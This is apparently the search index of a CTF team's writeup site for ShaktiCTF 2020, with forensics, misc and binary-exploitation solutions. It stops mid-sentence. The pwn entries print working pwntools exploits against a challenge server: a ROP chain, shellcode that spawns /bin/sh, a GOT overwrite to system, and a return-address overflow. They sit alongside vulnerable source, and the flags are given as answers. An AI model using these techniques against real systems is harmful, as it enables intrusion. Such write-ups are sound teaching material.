{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to TeamShakti Writeups Introduction This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"Welcome to TeamShakti Writeups"},{"location":"#welcome-to-teamshakti-writeups","text":"","title":"Welcome to TeamShakti Writeups"},{"location":"#introduction","text":"This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus .","title":"Introduction"},{"location":"#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"The contents of this repo"},{"location":"about/","text":"About Us","title":"About Us"},{"location":"about/#about-us","text":"","title":"About Us"},{"location":"shaktictf/","text":"Welcome to ShaktiCTF Writeups Introduction This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . The contents of this repo This repo contains the writeups of varoius challenges from the CTF we organized. ShaktiCTF 2020 Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Stegnography Miscellaneous","title":"ShaktiCTF"},{"location":"shaktictf/#welcome-to-shaktictf-writeups","text":"","title":"Welcome to ShaktiCTF Writeups"},{"location":"shaktictf/#introduction","text":"This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus .","title":"Introduction"},{"location":"shaktictf/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from the CTF we organized.","title":"The contents of this repo"},{"location":"shaktictf/#shaktictf-2020","text":"Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Stegnography Miscellaneous","title":"ShaktiCTF 2020"},{"location":"ShaktiCTF20/forensics/Extract_m3/","text":"Extract M3 Challenge Description We got a clue for a pending criminal case but seems like there was a secret exchange of information among the suspects. Can you help us find what they were sharing so that we can punish the criminals? Short writeup Extract the data from TCP packets where the length of bytes is more than 900 and save it as a new pcapng file. Use scapy to extract the jpg image data from the new pcapng file. from scapy.all import * r=rdpcap('newfile.pcapng') s='' for i in r: s+=i.load open('image.jpg','w').write(s) Extract the zip file using binwalk which is password protected. Use fcrackzip and rockyou.txt to find out the password and open the pdf file. Select the entire file and change the text colour to black to view the flag. Challenge Author v1Ru5 Flag shaktictf{h0p3_y0u_ar3_enj0ying_thi5}","title":"Extract M3"},{"location":"ShaktiCTF20/forensics/Extract_m3/#extract-m3","text":"","title":"Extract M3"},{"location":"ShaktiCTF20/forensics/Extract_m3/#challenge-description","text":"We got a clue for a pending criminal case but seems like there was a secret exchange of information among the suspects. Can you help us find what they were sharing so that we can punish the criminals?","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/Extract_m3/#short-writeup","text":"Extract the data from TCP packets where the length of bytes is more than 900 and save it as a new pcapng file. Use scapy to extract the jpg image data from the new pcapng file. from scapy.all import * r=rdpcap('newfile.pcapng') s='' for i in r: s+=i.load open('image.jpg','w').write(s) Extract the zip file using binwalk which is password protected. Use fcrackzip and rockyou.txt to find out the password and open the pdf file. Select the entire file and change the text colour to black to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/Extract_m3/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/Extract_m3/#flag","text":"shaktictf{h0p3_y0u_ar3_enj0ying_thi5}","title":"Flag"},{"location":"ShaktiCTF20/forensics/Not_that_easy/","text":"Not That Easy Challenge Description We have intercepted the communication between two criminals and we found that they had shared a secret information. Can you find out the secret? Short writeup There are a set of TCP packets with some data present in their buffer that eventually leads us to the wrong flag. The packet with size 521 bytes begins with file signature - 89 50 4e 47 0d 0a....which is a PNG image. Extract the image and use zbarimg to view the flag. Challenge Author v1Ru5 Flag shaktictf{sh3_w4s_h0n0r3d_by_3lectr0nic_fr0nti3r_f0und4ti0n}","title":"Not That Easy"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#not-that-easy","text":"","title":"Not That Easy"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#challenge-description","text":"We have intercepted the communication between two criminals and we found that they had shared a secret information. Can you find out the secret?","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#short-writeup","text":"There are a set of TCP packets with some data present in their buffer that eventually leads us to the wrong flag. The packet with size 521 bytes begins with file signature - 89 50 4e 47 0d 0a....which is a PNG image. Extract the image and use zbarimg to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#flag","text":"shaktictf{sh3_w4s_h0n0r3d_by_3lectr0nic_fr0nti3r_f0und4ti0n}","title":"Flag"},{"location":"ShaktiCTF20/forensics/intro/","text":"Forensics Challenge Name Level Author Concept Extract M3 Hard v1Ru5 network,wireshark,scapy Not that easy Medium v1Ru5 network,wireshark Shark on wire Very Easy v1Ru5 network,wireshark zip zap zoo Easy v1Ru5 zip,file forensics","title":"Forensics"},{"location":"ShaktiCTF20/forensics/intro/#forensics","text":"Challenge Name Level Author Concept Extract M3 Hard v1Ru5 network,wireshark,scapy Not that easy Medium v1Ru5 network,wireshark Shark on wire Very Easy v1Ru5 network,wireshark zip zap zoo Easy v1Ru5 zip,file forensics","title":"Forensics"},{"location":"ShaktiCTF20/forensics/shark_on_wire/","text":"Shark on Wire Challenge Description Lara sent me a file which had some hidden message. Help me recover the secret information. Short writeup Follow the TCP stream to see the flag. Challenge Author v1Ru5 Flag shaktictf{wir3sh4rk_i5_ju5t_aw3s0m3}","title":"Shark on Wire"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#shark-on-wire","text":"","title":"Shark on Wire"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#challenge-description","text":"Lara sent me a file which had some hidden message. Help me recover the secret information.","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#short-writeup","text":"Follow the TCP stream to see the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#flag","text":"shaktictf{wir3sh4rk_i5_ju5t_aw3s0m3}","title":"Flag"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/","text":"Zip Zap Zoo File Forensics Author : v1Ru5 Challenge Description We have hidden an important information for you in this file. But remember, it's not always about bruteforcing... Short writeup: Perform 'unzip challenge.zip' to see the password \"h4ckTh35t3R30tyP35\". Extract file.zip and correct the header of the zip file. Open flag.txt using the password and decode the data using any base32 decoder. flag : shaktictf{y4yYYyyY!_Y0u_g0t_1t_409515398}","title":"Zip Zap Zoo"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#zip-zap-zoo","text":"","title":"Zip Zap Zoo"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#file-forensics","text":"Author : v1Ru5","title":"File Forensics"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#challenge-description","text":"We have hidden an important information for you in this file. But remember, it's not always about bruteforcing...","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#short-writeup","text":"Perform 'unzip challenge.zip' to see the password \"h4ckTh35t3R30tyP35\". Extract file.zip and correct the header of the zip file. Open flag.txt using the password and decode the data using any base32 decoder. flag : shaktictf{y4yYYyyY!_Y0u_g0t_1t_409515398}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/10010101/","text":"10010101 Misc Author : v1Ru5 Challenge Description The story of initial six programmers is not over with them. They are going to recruit a team of fifty scientists to continue working on ENIAC. There are several spots for all of us and for that we need to solve this puzzle.I tried most of the conversions, but this seems to be a different language. I think the text file has something to do with the password of the zip file. Short writeup: Use any online SPOON language decoder to get the password to open the zip file. flag : shaktictf{yEsSsSssssSSS...Sp0oNNn!}","title":"10010101"},{"location":"ShaktiCTF20/misc/10010101/#10010101","text":"","title":"10010101"},{"location":"ShaktiCTF20/misc/10010101/#misc","text":"Author : v1Ru5","title":"Misc"},{"location":"ShaktiCTF20/misc/10010101/#challenge-description","text":"The story of initial six programmers is not over with them. They are going to recruit a team of fifty scientists to continue working on ENIAC. There are several spots for all of us and for that we need to solve this puzzle.I tried most of the conversions, but this seems to be a different language. I think the text file has something to do with the password of the zip file.","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/10010101/#short-writeup","text":"Use any online SPOON language decoder to get the password to open the zip file. flag : shaktictf{yEsSsSssssSSS...Sp0oNNn!}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/Wooooww/","text":"Wooooww Misc Author : v1Ru5 Challenge Description Some terrorists implanted a spy microphone in our office and tried sending some important project details to their country. The ENIAC programmers caught that and we need your help to extract the secret message. Flag format : shaktictf{STRING} Short writeup: Ignore other tones and decode the morse part of the mp3 file to get the flag. flag : shaktictf{LOLM0RS3I5FUNN}","title":"Wooooww"},{"location":"ShaktiCTF20/misc/Wooooww/#wooooww","text":"","title":"Wooooww"},{"location":"ShaktiCTF20/misc/Wooooww/#misc","text":"Author : v1Ru5","title":"Misc"},{"location":"ShaktiCTF20/misc/Wooooww/#challenge-description","text":"Some terrorists implanted a spy microphone in our office and tried sending some important project details to their country. The ENIAC programmers caught that and we need your help to extract the secret message. Flag format : shaktictf{STRING}","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/Wooooww/#short-writeup","text":"Ignore other tones and decode the morse part of the mp3 file to get the flag. flag : shaktictf{LOLM0RS3I5FUNN}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/intro/","text":"Misc Challenge Name Level Author Concept Wooooww Easy v1Ru5 audio,morse 10010101 Medium v1Ru5 esolang","title":"Misc"},{"location":"ShaktiCTF20/misc/intro/#misc","text":"Challenge Name Level Author Concept Wooooww Easy v1Ru5 audio,morse 10010101 Medium v1Ru5 esolang","title":"Misc"},{"location":"ShaktiCTF20/pwning/adventure_chain/","text":"Adventure Chain Challenge Author b3y0nd3r Challenge Description Kathleen is on her next adventure, which marked her name in history of Computer Science forever. Looks like the pieces of her ARC code seem to be brewing something notorious. Follow the chains which might lead you to a hideous place where you can claim your mastery and discover the unintended invention Short writeup Use ROPgadgets to bypass the argument checks and finally call the function which reads flag.txt. from pwn import * #p = process( ./chall ) p = remote('34.72.218.129',4444) p.sendlineafter( , 1 ) pop_rdi = p64(0x0000000000400a93) pop_rsi_r15 = p64(0x0000000000400a91) assert_ = p64(0x00000000004007d7) setValue = p64(0x00000000004007ec) flag = p64(0x000000000040082c) #exp = a *56 + auth + pop_rdi + p64(0xdeadbeef) + add_bal + pop_rdi + p64(0xba5eba11) + pop_rsi_r15 + p64(0xbedabb1e) + p64(0xbedabb1e) + flag exp = a *40 exp += assert_ exp += pop_rdi + p64(0xdeadbeef) exp += setValue exp += pop_rdi + p64(0xdeadc0de) exp += pop_rsi_r15 + p64(0xdead10cc) + a *8 exp += flag #gdb.attach(p) p.sendlineafter( Enter your name: ,exp) p.interactive() Flag shaktictf{r0pe_climbing_chaining_1337_way}","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/adventure_chain/#adventure-chain","text":"","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/adventure_chain/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/adventure_chain/#challenge-description","text":"Kathleen is on her next adventure, which marked her name in history of Computer Science forever. Looks like the pieces of her ARC code seem to be brewing something notorious. Follow the chains which might lead you to a hideous place where you can claim your mastery and discover the unintended invention","title":"Challenge Description"},{"location":"ShaktiCTF20/pwning/adventure_chain/#short-writeup","text":"Use ROPgadgets to bypass the argument checks and finally call the function which reads flag.txt. from pwn import * #p = process( ./chall ) p = remote('34.72.218.129',4444) p.sendlineafter( , 1 ) pop_rdi = p64(0x0000000000400a93) pop_rsi_r15 = p64(0x0000000000400a91) assert_ = p64(0x00000000004007d7) setValue = p64(0x00000000004007ec) flag = p64(0x000000000040082c) #exp = a *56 + auth + pop_rdi + p64(0xdeadbeef) + add_bal + pop_rdi + p64(0xba5eba11) + pop_rsi_r15 + p64(0xbedabb1e) + p64(0xbedabb1e) + flag exp = a *40 exp += assert_ exp += pop_rdi + p64(0xdeadbeef) exp += setValue exp += pop_rdi + p64(0xdeadc0de) exp += pop_rsi_r15 + p64(0xdead10cc) + a *8 exp += flag #gdb.attach(p) p.sendlineafter( Enter your name: ,exp) p.interactive()","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/adventure_chain/#flag","text":"shaktictf{r0pe_climbing_chaining_1337_way}","title":"Flag"},{"location":"ShaktiCTF20/pwning/compute_shell/","text":"Compute Shell Challenge Author b3y0nd3r Challenge Description Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the \"alpha\" in your favour! Short writeup A simple shellcode challenge. from pwn import * #p = process( ./chall ) p = remote('34.72.218.129',3333) p.recvuntil( Memory leak detected: ) p.recvline() leak = int(p.recvline().strip(),16) print(hex(leak)) #gdb.attach(p) p.recvuntil( Enter your code of action: ) exp = \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05 .ljust(0x48, \\x90 ) exp += p64(leak) print(len(exp)) p.sendline(exp) p.interactive() Flag shaktictf{cracking_v0n_neUmann_up}","title":"Compute Shell"},{"location":"ShaktiCTF20/pwning/compute_shell/#compute-shell","text":"","title":"Compute Shell"},{"location":"ShaktiCTF20/pwning/compute_shell/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/compute_shell/#challenge-description","text":"Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the \"alpha\" in your favour!","title":"Challenge Description"},{"location":"ShaktiCTF20/pwning/compute_shell/#short-writeup","text":"A simple shellcode challenge. from pwn import * #p = process( ./chall ) p = remote('34.72.218.129',3333) p.recvuntil( Memory leak detected: ) p.recvline() leak = int(p.recvline().strip(),16) print(hex(leak)) #gdb.attach(p) p.recvuntil( Enter your code of action: ) exp = \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05 .ljust(0x48, \\x90 ) exp += p64(leak) print(len(exp)) p.sendline(exp) p.interactive()","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/compute_shell/#flag","text":"shaktictf{cracking_v0n_neUmann_up}","title":"Flag"},{"location":"ShaktiCTF20/pwning/connect/","text":"Connect Challenge Author b3y0nd3r Description Your adventure begins here to help the renowned Computer Scientist Kathleen Booth to get across the challenges and win the race. Cross the gates and enter into the arena! Short writeup A very easy challenge. One just has to connect using the nc command and use bash commands like ls and cat to get the flag. Flag shaktictf{w3lc0me_t0_th3_ar3na_c0mrade}","title":"Connect"},{"location":"ShaktiCTF20/pwning/connect/#connect","text":"","title":"Connect"},{"location":"ShaktiCTF20/pwning/connect/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/connect/#description","text":"Your adventure begins here to help the renowned Computer Scientist Kathleen Booth to get across the challenges and win the race. Cross the gates and enter into the arena!","title":"Description"},{"location":"ShaktiCTF20/pwning/connect/#short-writeup","text":"A very easy challenge. One just has to connect using the nc command and use bash commands like ls and cat to get the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/connect/#flag","text":"shaktictf{w3lc0me_t0_th3_ar3na_c0mrade}","title":"Flag"},{"location":"ShaktiCTF20/pwning/intro/","text":"Binary Exploitation Table containing challenge status Challenge Name Level Author Concept Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudy return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r , rudy GOT overwrite","title":"Binary Exploitation"},{"location":"ShaktiCTF20/pwning/intro/#binary-exploitation","text":"Table containing challenge status Challenge Name Level Author Concept Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudy return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r , rudy GOT overwrite","title":"Binary Exploitation"},{"location":"ShaktiCTF20/pwning/reactor_got/","text":"Reactor_GOT Author b3y0nd3r rudyerudite Description The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time? PS: This challenge use the new updated Ubuntu 18.04 libc Writeup Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial RelRO is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a file chall ) which means the addresses are going to be 4 bytes. To learn more about the GOT table lookup here . Also, PIE is disabled as well- address of the GOT table is unrandomized each time. Let's get started with the challenge, we have 3 options here: add , show , break_armour . Mind you reactor here is a global array declared as: char *reactor[3][4] . void add(){ int idx; puts( Enter the index : ); scanf( %d , idx); puts( Enter the data : ); read(0,reactor[idx],0x4); } Nothing really looks suspicious here other than the signed idx . A possibility of integer overflow? Also, we can allocate/ write anything at reactor+idx , so if negative values of idx are allowed we can truly cause a havoc by overwriting the GOT table. As our reactor is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the libc system or any of the gadgets would help us. I followed the former easier approach. void show(){ int idx; puts( Enter the index : ); scanf( %d , idx); if(reactor[idx]) printf( %s\\n ,reactor[idx]); else puts( Not allocated! ); } Another thing to notice here is that there is no check on the idx which can be used to print the data stored at reactor+(-idx) location. I used this to get libc leaks as these addresses are randomized on each run because of ASLR . From the leaks I could calculate the address of system and I overwrote GOT table entry of printf with it. I used the 3rd option here, printf(break_) where break_ is '/bin/sh'. Lo and behold, the shell pops up and you cat your flag . As an alternative to getting leaks using the show function you can use the format string vulnerability in printf(break_) and get the required leaks. Exploit from pwn import * #p = process( ./chall ) p = remote('34.72.218.129',5555) def add(idx,data): p.sendlineafter( MELTDOWN)\\n , 1 ) p.sendlineafter( index :\\n ,str(idx)) p.sendlineafter( data :\\n ,data) def show(idx): p.sendlineafter( MELTDOWN)\\n , 2 ) p.sendlineafter( Enter the index :\\n ,str(idx)) def leave(): p.sendlineafter( MELTDOWN)\\n , 3 ) p.sendline( /bin/sh\\x00 ) show( 268435454 ) print( leaks: ) leak = u32(p.recvline()[:4].strip().ljust(4,'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 add( 268435449 ,p32(system)) #gdb.attach(p) leave() p.interactive() Source Code #include stdio.h #include stdlib.h #include unistd.h char *reactor[3][4]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); } void printmenu(){ puts( Choose your ACTION: ); puts( 1. add ); puts( 2. show ); puts( 3. break armour ); } void add(){ int idx; puts( Enter the index : ); scanf( %d , idx); puts( Enter the data : ); read(0,reactor[idx],0x4); } void show(){ int idx; puts( Enter the index : ); scanf( %d , idx); if(reactor[idx]) printf( %s\\n ,reactor[idx]); else puts( Not allocated! ); } int main() { int choice; int c = 0; initialize(); char break_[8]; printf( ARMOUR: enabled! Try to break in ;) ); gets(break_); while(c != 3){ puts( Welcome to The Reactor (current status: MELTDOWN) ); printmenu(); scanf( %d , choice); if(choice == 1) add(); else if(choice == 2) show(); else if(choice == 3) { printf(break_); } else exit(0); c += 1; } return 0; }","title":"Reactor_GOT"},{"location":"ShaktiCTF20/pwning/reactor_got/#reactor_got","text":"","title":"Reactor_GOT"},{"location":"ShaktiCTF20/pwning/reactor_got/#author","text":"b3y0nd3r rudyerudite","title":"Author"},{"location":"ShaktiCTF20/pwning/reactor_got/#description","text":"The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time? PS: This challenge use the new updated Ubuntu 18.04 libc","title":"Description"},{"location":"ShaktiCTF20/pwning/reactor_got/#writeup","text":"Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial RelRO is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a file chall ) which means the addresses are going to be 4 bytes. To learn more about the GOT table lookup here . Also, PIE is disabled as well- address of the GOT table is unrandomized each time. Let's get started with the challenge, we have 3 options here: add , show , break_armour . Mind you reactor here is a global array declared as: char *reactor[3][4] . void add(){ int idx; puts( Enter the index : ); scanf( %d , idx); puts( Enter the data : ); read(0,reactor[idx],0x4); } Nothing really looks suspicious here other than the signed idx . A possibility of integer overflow? Also, we can allocate/ write anything at reactor+idx , so if negative values of idx are allowed we can truly cause a havoc by overwriting the GOT table. As our reactor is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the libc system or any of the gadgets would help us. I followed the former easier approach. void show(){ int idx; puts( Enter the index : ); scanf( %d , idx); if(reactor[idx]) printf( %s\\n ,reactor[idx]); else puts( Not allocated! ); } Another thing to notice here is that there is no check on the idx which can be used to print the data stored at reactor+(-idx) location. I used this to get libc leaks as these addresses are randomized on each run because of ASLR . From the leaks I could calculate the address of system and I overwrote GOT table entry of printf with it. I used the 3rd option here, printf(break_) where break_ is '/bin/sh'. Lo and behold, the shell pops up and you cat your flag . As an alternative to getting leaks using the show function you can use the format string vulnerability in printf(break_) and get the required leaks.","title":"Writeup"},{"location":"ShaktiCTF20/pwning/reactor_got/#exploit","text":"from pwn import * #p = process( ./chall ) p = remote('34.72.218.129',5555) def add(idx,data): p.sendlineafter( MELTDOWN)\\n , 1 ) p.sendlineafter( index :\\n ,str(idx)) p.sendlineafter( data :\\n ,data) def show(idx): p.sendlineafter( MELTDOWN)\\n , 2 ) p.sendlineafter( Enter the index :\\n ,str(idx)) def leave(): p.sendlineafter( MELTDOWN)\\n , 3 ) p.sendline( /bin/sh\\x00 ) show( 268435454 ) print( leaks: ) leak = u32(p.recvline()[:4].strip().ljust(4,'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 add( 268435449 ,p32(system)) #gdb.attach(p) leave() p.interactive()","title":"Exploit"},{"location":"ShaktiCTF20/pwning/reactor_got/#source-code","text":"#include stdio.h #include stdlib.h #include unistd.h char *reactor[3][4]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); } void printmenu(){ puts( Choose your ACTION: ); puts( 1. add ); puts( 2. show ); puts( 3. break armour ); } void add(){ int idx; puts( Enter the index : ); scanf( %d , idx); puts( Enter the data : ); read(0,reactor[idx],0x4); } void show(){ int idx; puts( Enter the index : ); scanf( %d , idx); if(reactor[idx]) printf( %s\\n ,reactor[idx]); else puts( Not allocated! ); } int main() { int choice; int c = 0; initialize(); char break_[8]; printf( ARMOUR: enabled! Try to break in ;) ); gets(break_); while(c != 3){ puts( Welcome to The Reactor (current status: MELTDOWN) ); printmenu(); scanf( %d , choice); if(choice == 1) add(); else if(choice == 2) show(); else if(choice == 3) { printf(break_); } else exit(0); c += 1; } return 0; }","title":"Source Code"},{"location":"ShaktiCTF20/pwning/returning/","text":"Adventure Chain Author rudyerudite Description Kathleen is faced with a very naive looking code which keeps all you secrets and never lets anyone know. Try figuring out lies here! Solution Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : No NX : Yes PIE : No Fortify : No RelRO : Partial We see that canary is disabled here which might give us a possible buffer overflow if we are able to get a primitive. Another thing, PIE is disbaled as well, so that means the addresses of all user defined functions and global variables are going to be same on each run. So let's look at the disassmebly of the binary. We see that the binary lets us input 20 characters. We can do this atmost 2 times. Sound uninteresting at this point? Let's have a closer look at what the main is upto (mind that count , buffer1 , ch and pos are global variables not in the snippet for brevity): void main() { char buffer[8]; initialize(); puts( \\nWelcome! A lonely mute program is all I am... ); puts( \\nWould you like to talk to me? (y/n) ); scanf( %c , ch[1]); while(ch[1]=='y' count 2) { puts( Say something... ); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1, %s ,buffer1); puts( \\nWould you like to continue talking to me? (y/n) ); scanf( %c , ch[1]); count+=1; } printf( %d Any bidding words?\\n ,pos); getchar(); read(0,buffer,pos); return; } Okay, depending on the return value of snprintf we can read pos bytes on our buffer. As we earlier saw that the Canary is disbaled on stack, thus if pos sizeof(buffer) we can cause a stack buffer overflow! Now that's something worth noting. Moving on, is it possible to fulfill that condition? Let's have a closer look at the snprintf function. On a quick lookup by doing man sprintf on your terminal, you'll find that snprintf returns the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. -- Does that strike anything? So well sprintf here is writing 1 byte from buffer1 to buffer . If I read 20 bytes into buffer1 could you think about the return value of the function snprintf ? Leaving that as an exercise to the reader. By using the trick of the return value of sprintf (added each time to pos ), we can increment pos to a value such that pos sizeof(buffer) . Doing this would give us a buffer overflow. We have another interesting function which we didn't check before, but this one is not getting called anywhere in our whole program: void win() { char flag[50]; FILE *ptr; ptr = fopen( flag.txt , r ); if(ptr == NULL) { printf( Error! ); exit(1); } fgets(flag,50, (FILE*)ptr); printf( %s\\n ,flag); exit(0); } We initially saw that PIE is disabled on the binary, thus we just have to overwrite the return address of main() to the win() function in order to call ' win() after main() function returns. What does that do now? As we can see that calling win() would help us read the flag.txt file, this is supposed to be our final destination. So exploit the overflow to overwrite the return address and run away with the flag! Exploit from pwn import * #p = process( ./chall ) p = remote( 34.72.218.129 ,2222) p.sendline( y ) p.sendline( a *19) p.sendline( y ) p.sendline( b *19) p.sendline( n ) #gdb.attach(p) payload = 'a'*24 + p64(0x400921) p.sendline(payload) p.interactive() Source Code #include stdio.h #include stdlib.h #include unistd.h #include string.h int count=0, pos=0; char buffer1[20]; char ch[2]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); alarm(30); } void win() { char flag[50]; FILE *ptr; ptr = fopen( flag.txt , r ); if(ptr == NULL) { printf( Error! ); exit(1); } fgets(flag,50, (FILE*)ptr); printf( %s\\n ,flag); exit(0); } void main() { char buffer[8]; initialize(); puts( \\nWelcome! A lonely mute program is all I am... ); puts( \\nWould you like to talk to me? (y/n) ); scanf( %c , ch[1]); while(ch[1]=='y' count 2) { puts( Say something... ); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1, %s ,buffer1); puts( \\nWould you like to continue talking to me? (y/n) ); scanf( %c , ch[1]); count+=1; } printf( %d Any bidding words?\\n ,pos); getchar(); read(0,buffer,pos); return; }","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/returning/#adventure-chain","text":"","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/returning/#author","text":"rudyerudite","title":"Author"},{"location":"ShaktiCTF20/pwning/returning/#description","text":"Kathleen is faced with a very naive looking code which keeps all you secrets and never lets anyone know. Try figuring out lies here!","title":"Description"},{"location":"ShaktiCTF20/pwning/returning/#solution","text":"Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : No NX : Yes PIE : No Fortify : No RelRO : Partial We see that canary is disabled here which might give us a possible buffer overflow if we are able to get a primitive. Another thing, PIE is disbaled as well, so that means the addresses of all user defined functions and global variables are going to be same on each run. So let's look at the disassmebly of the binary. We see that the binary lets us input 20 characters. We can do this atmost 2 times. Sound uninteresting at this point? Let's have a closer look at what the main is upto (mind that count , buffer1 , ch and pos are global variables not in the snippet for brevity): void main() { char buffer[8]; initialize(); puts( \\nWelcome! A lonely mute program is all I am... ); puts( \\nWould you like to talk to me? (y/n) ); scanf( %c , ch[1]); while(ch[1]=='y' count 2) { puts( Say something... ); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1, %s ,buffer1); puts( \\nWould you like to continue talking to me? (y/n) ); scanf( %c , ch[1]); count+=1; } printf( %d Any bidding words?\\n ,pos); getchar(); read(0,buffer,pos); return; } Okay, depending on the return value of snprintf we can read pos bytes on our buffer. As we earlier saw that the Canary is disbaled on stack, thus if pos sizeof(buffer) we can cause a stack buffer overflow! Now that's something worth noting. Moving on, is it possible to fulfill that condition? Let's have a closer look at the snprintf function. On a quick lookup by doing man sprintf on your terminal, you'll find that snprintf returns the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. -- Does that strike anything? So well sprintf here is writing 1 byte from buffer1 to buffer . If I read 20 bytes into buffer1 could you think about the return value of the function snprintf ? Leaving that as an exercise to the reader. By using the trick of the return value of sprintf (added each time to pos ), we can increment pos to a value such that pos sizeof(buffer) . Doing this would give us a buffer overflow. We have another interesting function which we didn't check before, but this one is not getting called anywhere in our whole program: void win() { char flag[50]; FILE *ptr; ptr = fopen( flag.txt , r ); if(ptr == NULL) { printf( Error! ); exit(1); } fgets(flag,50, (FILE*)ptr); printf( %s\\n ,flag); exit(0); } We initially saw that PIE is disabled on the binary, thus we just have to overwrite the return address of main() to the win() function in order to call ' win() after main() function returns. What does that do now? As we 